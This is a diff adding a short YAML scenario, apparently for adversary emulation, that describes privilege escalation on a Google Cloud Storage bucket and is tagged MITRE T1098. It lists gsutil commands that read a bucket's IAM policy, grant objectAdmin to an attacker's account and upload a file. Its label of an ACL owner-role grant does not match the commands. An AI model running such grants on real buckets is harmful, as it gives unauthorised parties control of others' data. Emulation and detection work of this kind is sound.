@@ -1,0 +1,11 @@
+name: GCP Bucket ACL Exploitation for Privilege Escalation
+description: Escalates privilege by assigning owner role via ACLs.
+mitre_technique: T1098
+stage: Privilege Escalation
+steps:
+- action: gsutil iam get gs://<bucket-name>
+  description: Review existing IAM policy on the bucket
+- action: gsutil iam ch user:<attacker-email>:objectAdmin gs://<bucket-name>
+  description: Assign objectAdmin to attacker
+- action: gsutil cp sensitive_file.txt gs://<bucket-name>
+  description: Upload sensitive file to access or manipulate it
